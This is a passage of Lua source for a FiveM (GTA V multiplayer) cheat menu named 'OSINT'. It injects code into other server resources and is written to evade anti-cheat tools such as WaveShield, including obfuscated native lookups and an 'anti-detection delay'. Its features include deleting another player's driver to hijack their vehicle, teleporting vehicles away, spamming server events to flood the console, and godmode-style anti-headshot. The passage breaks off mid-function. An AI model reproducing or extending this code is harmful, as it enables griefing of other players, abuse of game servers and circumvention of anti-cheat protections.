                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function TeleportVehicleToOcean(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        SetEntityCoords(vehicle, 0.0, 0.0, 0.0, false, false, false, false)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    TeleportVehicleToOcean(entityHit)
                                                end
                                            end)
                                        ]])
                                        end

                                        -- MachoInjectResourceRaw(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                        --     function hNative(nativeName, newFunction)
                                        --         local originalNative = _G[nativeName]
                                        --         if not originalNative or type(originalNative) ~= "function" then
                                        --             return
                                        --         end
                                        --         _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        --     end

                                        --     hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                        --     local function RequestControl(entity, timeoutMs)
                                        --         timeoutMs = timeoutMs or 2000
                                        --         local start = GetGameTimer()

                                        --         while (GetGameTimer() - start) < timeoutMs do
                                        --             if NetworkHasControlOfEntity(entity) then return true end
                                        --             NetworkRequestControlOfEntity(entity)
                                        --             Wait(0)
                                        --         end

                                        --         return NetworkHasControlOfEntity(entity)
                                        --     end

                                        --     local function RotationToDirection(rot)
                                        --         local z = math.rad(rot.z)
                                        --         local x = math.rad(rot.x)
                                        --         local num = math.abs(math.cos(x))
                                        --         return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        --     end

                                        --     function GetEmptySeat(vehicle)
                                        --         local seats = { -1, 0, 1, 2 }

                                        --         for _, seat in ipairs(seats) do
                                        --             if IsVehicleSeatFree(vehicle, seat) then
                                        --                 return seat
                                        --             end
                                        --         end

                                        --         return -1
                                        --     end

                                        --     local player = PlayerPedId()
                                        --     local oldCoords = GetEntityCoords(player)

                                        --     local function KickFromVehicle(vehicle)
                                        --         if not vehicle or not DoesEntityExist(vehicle) then
                                        --             return
                                        --         end

                                        --         local driver = GetPedInVehicleSeat(vehicle, -1)
                                        --         if driver ~= 0 and DoesEntityExist(driver) then
                                        --             SetPedIntoVehicle(player, vehicle, 0)
                                        --             RequestControl(vehicle, 2000)
                                        --             Wait(10)

                                        --             for i = 0, 4 do
                                        --                 DeletePed(driver)
                                        --             end

                                        --             Wait(40)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             TaskLeaveVehicle(player, vehicle, 16)
                                        --             Wait(450)
                                        --             ClearPedTasksImmediately(player)
                                        --             SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                        --             Wait(100)
                                        --         end
                                        --     end

                                        --     CreateThread(function()
                                        --         local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                        --         print(entityHit)

                                        --         if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        --             KickFromVehicle(entityHit)
                                        --         end
                                        --     end)
                                        -- ]])
                                    else
                                        return
                                    end

                                    CPlayers[targetPlayer] = true
                                    self:UpdateListMenu()
                                else
                                    self:Notify("error", "OSINT", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                    }
                },
                {
                    label = "Triggers",
                    tabs = {
                    { type = "checkbox", label = "Server Console Spam", checked = false,
                        onSelect = function(checked)
                            if checked then
                                print('Console Spam Started...')
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                    if not _G.OSINTServerConsoleSpamInitialized then
                                        _G.OSINTServerConsoleSpamEnabled = true
                                        _G.OSINTServerConsoleSpamInitialized = true

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("CreateThread", function(fn, cb) return fn(cb) end)
                                        HookNative("Wait", function(fn, ms) return fn(ms) end)
                                        HookNative("TriggerEvent", function(fn, ...) return fn(...) end)
                                        HookNative("TriggerServerEvent", function(fn, ...) return fn(...) end)

                                        if not _G.OSINT then
                                            _G.OSINT = {
                                                TEvent = function(e, ...) return TriggerEvent(e, ...) end,
                                                TSEvent = function(e, ...) return TriggerServerEvent(e, ...) end
                                            }
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Spam Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(500) -- Anti-detection delay
                                            while _G.OSINTServerConsoleSpamInitialized do
                                                if not _G.OSINTServerConsoleSpamEnabled then
                                                    Citizen.Wait(500)
                                                else
                                                    _G.OSINT.TSEvent("playerLoaded")
                                                    Citizen.Wait(75)
                                                end
                                            end
                                        end)
                                    else
                                        _G.OSINTServerConsoleSpamEnabled = true
                                    end
                                ]])
                            else
                                print('Console Spam Stopped...')
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                    _G.OSINTServerConsoleSpamEnabled = false
                                ]])
                            end
                        end
                    },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Weapon",
            type = "subMenu",
            categories = {
                {
                    label = "Spawner",
                    tabs = {
                        { type = "button", label = "Give Weapon",
                            onSelect = function()
                                KeyboardInput("Weapon Name", "WEAPON_", function(val)
                                    if val and val ~= "" then
                                        self:SpawnSelectedWeapon(val)
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "button", label = "Give All Weapons",
                            onSelect = function()
                                self:GiveAllWeapons()
                            end
                        },
                        { type = "button", label = "Remove All Weapons",
                            onSelect = function()
                                self:RemoveAllWeapons()
                            end
                        },
                        { type = "divider", label = "All Weapons" },
                        { type = "scrollable", label = "Melee", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_unarmed", "weapon_knife", "weapon_dagger", "weapon_bat", "weapon_bottle", "weapon_crowbar", "weapon_golfclub", "weapon_hammer", "weapon_hatchet", "weapon_machete", "weapon_switchblade", "weapon_nightstick", "weapon_wrench" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Handguns", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_pistol", "weapon_pistol_mk2", "weapon_combatpistol", "weapon_appistol", "weapon_stungun", "weapon_pistol50", "weapon_snspistol", "weapon_heavypistol", "weapon_vintagepistol", "weapon_flaregun" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "SMGs", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_microsmg", "weapon_smg", "weapon_smg_mk2", "weapon_assaultsmg", "weapon_machinepistol", "weapon_minismg", "weapon_combatpdw" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Rifles", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_assaultrifle", "weapon_assaultrifle_mk2", "weapon_carbinerifle", "weapon_carbinerifle_mk2", "weapon_advancedrifle", "weapon_specialcarbine", "weapon_bullpuprifle", "weapon_gusenberg", "weapon_compactrifle", "weapon_bullpuprifle_mk2", "weapon_marksmanrifle" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Shotguns", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_pumpshotgun", "weapon_pumpshotgun_mk2", "weapon_sawnoffshotgun", "weapon_assaultshotgun", "weapon_bullpupshotgun", "weapon_heavyshotgun", "weapon_autoshotgun" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Snipers", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_sniperrifle", "weapon_heavysniper", "weapon_heavysniper_mk2", "weapon_marksmanrifle", "weapon_marksmanrifle_mk2" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Explosives", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_grenade", "weapon_stickybomb", "weapon_molotov", "weapon_pipebomb", "weapon_proxmine", "weapon_rpg", "weapon_grenadelauncher", "weapon_rpg", "weapon_minigun", "weapon_firework" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Heavy", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_mg", "weapon_combatmg", "weapon_gusenberg", "weapon_minigun", "weapon_grenadelauncher", "weapon_railgun", "weapon_hominglauncher", "weapon_compactlauncher" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Throwables", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_ball", "weapon_flare", "weapon_smokegrenade", "weapon_bzgas", "weapon_petrolcan" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        }
                    }
                },
                {
                    label = "Combat",
                    tabs = {
                        { type = "button", label = "Test Button",
                        onSelect = function()
                        print('hi')
                        end
                        },
                        { type = "checkbox", label = "Infinite Ammo ", desc = "Infinite Ammo, this might be detected on certain servers", checked = false,
                            onSelect = function(checked)
                                if checked then
                                self:Notify("success", "OSINT", "Enabled Infinite Ammo", 5000)
                                    self:EnableInfiniteAmmo()
                                else
                                self:Notify("error", "OSINT", "Disabled Infinite Ammo", 5000)                                    
                                    self:DisableInfiniteAmmo()
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Headshot",
                            checked = false,
                            desc = "This will prevent you from being headshot.",
                            onSelect = function(checked)
                                if checked then
                                    self:Notify("success", "OSINT", "Enabled Anti-Headshot", 5000)
                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor"
                                                or GetResourceState("ox_lib") == "started" and "ox_lib"
                                                or "any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n) return _G[decode(n)] end

                                            -- native wrappers (obfuscated lookup style)
                                            local SetPedSuffersCriticalHits = g({83,101,116,80,101,100,83,117,102,102,101,114,115,67,114,105,116,105,99,97,108,72,105,116,115})
                                            local PlayerPedId_fn = g({80,108,97,121,101,114,80,101,100,73,100})
                                            local Wait_fn = g({87,97,105,116})

                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                -- initFlow (coroutine runner) — copy of your project's coroutine runner pattern
                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[AntiHeadshot] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.antiHeadshotEnabled and not Unloaded do
                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits(ped, false)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                local CreateThread_fn = CreateThread
                                                local Wait_fn = Wait
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait_fn(0)
                                                        if not _G.antiHeadshotEnabled then
                                                            Wait_fn(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits_fn(ped, false)
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end
                                            _G.antiHeadshotEnabled = true
                                        ]])
                                    end

                                else
                                    self:Notify("error", "OSINT", "Disabled Anti-Headshot", 5000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor"
                                                or GetResourceState("ox_lib") == "started" and "ox_lib"
                                                or "any",
                                        [[
                                            -- simply clear the flag; coroutine loop will stop
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false
                                        ]])
                                    else
                                        Injection("any", [[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false

                                            -- try to restore default behavior once (best-effort)
                                            if PlayerPedId and SetPedSuffersCriticalHits then
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                                                end
                                            end
                                        ]])
                                    end
                                end
                            end
                        },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Vehicle",
            type = "subMenu",
            categories = {
                {
                    label = "Spawner",
                    tabs = {
                        { type = "checkbox", label = "Teleport Into", desc = "If selected, this will teleport you into the selected vehicle.", checked = false,
                            onSelect = function(checked)
                                TeleportInto = checked or false
                            end
                        },
                        { type = "checkbox", label = "Delete Previous", desc = "If selected, this will delete your previous vehicle when spawning selected vehicle.", checked = false,
                            onSelect = function(checked)
                                DeletePrevious = checked or false
                            end
                        },
                        { type = "divider", label = "All Vehicles" },
                        { type = "button", label = "Addon",
                            onSelect = function()
                                KeyboardInput("Addon Vehicle", "", function(val)
                                    if val and val ~= "" then
                                        self:SpawnSelectedVehicle(val, TeleportInto, DeletePrevious)
                                    end
                                end, "typeable")
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Compacts",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "asbo", "blista", "brioso", "brioso2", "brioso3", "club", "dilettante", "dilettante2", "issi2", "issi3", "issi4", "issi5", "issi6", "kanjo", "panto", "prairie", "rhapsody", "weevil" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sedans",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "asea", "asea2", "asterope", "asterope2", "cinquemila", "driftchavosv6", "cog55", "cog552", "cognoscenti", "cognoscenti2", "deity", "hardy", "drifthardy", "emperor", "emperor2", "emperor3", "fugitive", "glendale", "glendale2", "impaler5", "ingot", "intruder", "minimus", "limo2", "premier", "primo", "primo2", "regina", "rhinehart", "romero", "schafter2", "schafter5", "schafter6", "stafford", "stanier", "stratum", "stretch", "superd", "surge", "tailgater", "tailgater2", "warrener", "warrener2", "washington" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "SUVs",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "aleutian", "astron", "baller", "baller2", "baller3", "baller4", "baller5", "baller6", "baller7", "baller8", "bjxl", "cavalcade", "cavalcade2", "cavalcade3", "contender", "dorado", "dubsta", "dubsta2", "everon3", "fq2", "granger", "granger2", "gresley", "habanero", "huntley", "issi8", "iwagen", "jubilee", "landstalker", "landstalker2", "mesa", "mesa2", "novak", "patriot", "patriot2", "radi", "rebla", "rocoto", "seminole", "seminole2", "serrano", "squaddie", "toros", "vivanite", "woodlander", "xls", "xls2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Coupes",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "cogcabrio", "driftfr36", "exemplar", "f620", "felon", "felon2", "fr36", "jackal", "kanjosj", "oracle", "oracle2", "postlude", "previon", "sentinel", "sentinel2", "windsor", "windsor2", "zion", "zion2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Muscles",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "blade", "brigham", "broadway", "buccaneer", "buccaneer2", "buffalo4", "buffalo5", "chino", "chino2", "clique", "clique2", "coquette3", "deviant", "dominator", "dominator2", "dominator3", "dominator4", "dominator5", "dominator6", "dominator7", "dominator8", "dominator9", "driftdominator10", "driftyosemite", "dukes", "dukes2", "dukes3", "ellie", "eudora", "faction", "faction2", "faction3", "gauntlet", "gauntlet2", "gauntlet3", "gauntlet4", "gauntlet5", "driftgauntlet4", "greenwood", "hermes", "hotknife", "hustler", "impaler", "impaler2", "impaler3", "impaler4", "impaler6", "imperator", "imperator2", "imperator3", "lurcher", "manana2", "moonbeam", "moonbeam2", "nightshade", "peyote2", "phoenix", "picador", "ratloader", "ratloader2", "ruiner", "ruiner2", "ruiner3", "ruiner4", "sabregt", "sabregt2", "slamvan", "slamvan2", "slamvan3", "slamvan4", "slamvan5", "slamvan6", "stalion", "stalion2", "tahoma", "tampa", "tampa3", "tampa4", "tulip", "tulip2", "vamos", "vigero", "vigero2", "vigero3", "virgo", "virgo2", "virgo3", "voodoo", "voodoo2", "weevil2", "yosemite", "yosemite2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sports Classic",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "ardent", "btype", "btype2", "btype3", "casco", "cheburek", "cheetah2", "cheetah3", "coquette2", "deluxo", "dynasty", "fagaloa", "feltzer3", "gt500", "infernus2", "jb700", "jb7002", "mamba", "manana", "michelli", "monroe", "nebula", "peyote", "peyote3", "pigalle", "rapidgt3", "retinue", "retinue2", "savestra", "stinger", "stingergt", "stromberg", "swinger", "toreador", "torero", "tornado", "tornado2", "tornado3", "tornado4", "tornado5", "tornado6", "turismo2", "viseris", "z190", "zion3", "ztype" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sports",
                            type = "scrollable",
                            value = 1,
                            values = { "alpha", "banshee", "bestiagts", "blista2", "blista3", "buffalo", "buffalo2", "buffalo3", "calico", "carbonizzare", "comet2", "comet3", "comet4", "comet5", "comet6", "comet7", "coquette", "coquette4", "corsita", "coureur", "cypher", "drafter", "drifteuros", "driftfuto", "driftjester", "driftremus", "drifttampa", "driftzr350", "elegy", "elegy2", "euros", "everon2", "feltzer2", "flashgt", "furoregt", "fusilade", "futo", "futo2", "gauntlet6", "gb200", "growler", "hotring", "imorgon", "issi7", "italigto", "italirsx", "jester", "jester2", "jester3", "jester4", "jugular", "khamelion", "komoda", "kuruma", "kuruma2", "locust", "lynx", "massacro", "massacro2", "neo", "neon", "ninef", "ninef2", "omnis", "omnisegt", "panthere", "paragon", "paragon2", "pariah", "penumbra", "penumbra2", "r300", "raiden", "rapidgt", "rapidgt2", "rapidgt4", "raptor", "remus", "revolter", "rt3000", "ruston", "schafter3", "schafter4", "schlagen", "schwarzer", "sentinel3", "sentinel4", "sentinel5", "seven70", "sm722", "specter", "specter2", "stingertt", "streiter", "sugoi", "sultan", "sultan2", "sultan3", "surano", "tampa2", "tenf", "tenf2", "tropos", "vectre", "verlierer2", "veto", "veto2", "vstr", "zr350", "zr380", "zr3802", "zr3803" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Super",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "adder", "autarch", "banshee2", "bullet", "champion", "cheetah", "cyclone", "deveste", "emerus", "entity2", "entity3", "entityxf", "fmj", "furia", "gp1", "ignus", "infernus", "italigtb", "italigtb2", "krieger", "le7b", "lm87", "nero", "nero2", "osiris", "penetrator", "pfister811", "prototipo", "reaper", "s80", "sc1", "scramjet", "sheava", "sultanrs", "suzume", "t20", "taipan", "tempesta", "tezeract", "thrax", "tigon", "torero2", "turismo3", "turismor", "tyrant", "tyrus", "vacca", "vagner", "vigilante", "virtue", "visione", "voltic", "voltic2", "xa21", "zeno", "zentorno", "zorrusso" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Motorcycles",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "akuma", "avarus", "bagger", "bati", "bati2", "bf400", "carbonrs", "chimera", "cliffhanger", "daemon", "daemon2", "deathbike", "deathbike2", "deathbike3", "defiler", "diablous", "diablous2", "double", "enduro", "esskey", "faggio", "faggio2", "faggio3", "fcr", "fcr2", "gargoyle", "hakuchou", "hakuchou2", "hexer", "innovation", "lectro", "manchez", "manchez2", "manchez3", "nemesis", "nightblade", "oppressor", "oppressor2", "pcj", "powersurge", "ratbike", "reever", "rrocket", "ruffian", "sanchez", "sanchez2", "sanctus", "shinobi", "shotaro", "sovereign", "stryder", "thrust", "vader", "vindicator", "vortex", "wolfsbane", "zombiea", "zombieb" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Off-Road",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bfinjection", "bifta", "blazer", "blazer2", "blazer3", "blazer4", "blazer5", "bodhi2", "boor", "brawler", "bruiser", "bruiser2", "bruiser3", "brutus", "brutus2", "brutus3", "caracara", "caracara2", "dloader", "draugur", "driftl352", "dubsta3", "dune", "dune2", "dune3", "dune4", "dune5", "freecrawler", "hellion", "insurgent", "insurgent2", "insurgent3", "kalahari", "kamacho", "l35", "l352", "marshall", "menacer", "mesa3", "monster", "monster3", "monster4", "monster5", "monstrociti", "nightshark", "outlaw", "patriot3", "rancherxl", "rancherxl2", "ratel", "rcbandito", "rebel", "rebel2", "riata", "sandking", "sandking2", "technical", "technical2", "technical3", "terminus", "trophytruck", "trophytruck2", "vagrant", "verus", "winky", "yosemite3", "zhaba" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Industrial",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bulldozer", "cutter", "dump", "flatbed", "flatbed2", "guardian", "handler", "mixer", "mixer2", "rubble", "tiptruck", "tiptruck2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Utility",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "airtug", "armytanker", "armytrailer", "armytrailer2", "baletrailer", "boattrailer", "boattrailer2", "boattrailer3", "caddy", "caddy2", "caddy3", "docktrailer", "docktug", "forklift", "freighttrailer", "graintrailer", "mower", "proptrailer", "raketrailer", "ripley", "sadler", "sadler2", "scrap", "slamtruck", "tanker", "tanker2", "towtruck", "towtruck2", "towtruck3", "towtruck4", "tr2", "tr3", "tr4", "tractor", "tractor2", "tractor3", "trailerlarge", "trailerlogs", "trailers", "trailers2", "trailers3", "trailers4", "trailers5", "trailersmall", "trflat", "tvtrailer", "tvtrailer2", "utillitruck", "utillitruck2", "utillitruck3" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Vans",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bison", "bison2", "bison3", "bobcatxl", "boxville", "boxville2", "boxville3", "boxville4", "boxville5", "boxville6", "burrito", "burrito2", "burrito3", "burrito4", "burrito5", "camper", "gburrito", "gburrito2", "journey", "journey2", "minivan", "minivan2", "paradise", "pony", "pony2", "rumpo", "rumpo2", "rumpo3", "speedo", "speedo2", "speedo4", "speedo5", "surfer", "surfer2", "surfer3", "taco", "youga", "youga2", "youga3", "youga4" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                    }
                },
                {
                    label = "Vehicle Customization",
                    tabs = {
                        -- { type = "button", label = "test button",
                        --     onSelect = function()
                        --         self:RepairVehicle()
                        --     end
                        -- },

                    -- { type = "checkbox", label = "Test", checked = false,
                    --     onSelect = function(checked)
                    --         if checked then
                    --             print("on")
                    --         else
                    --             print("off")
                    --         end
                    --     end
                    -- },
                        {
                            type = "button",
                            label = "Set License Plate",
                            onSelect = function()
                                KeyboardInput("Set License Plate", "", function(val)
                                    if val and val ~= "" then
                                        local injectedCode = string.format([[
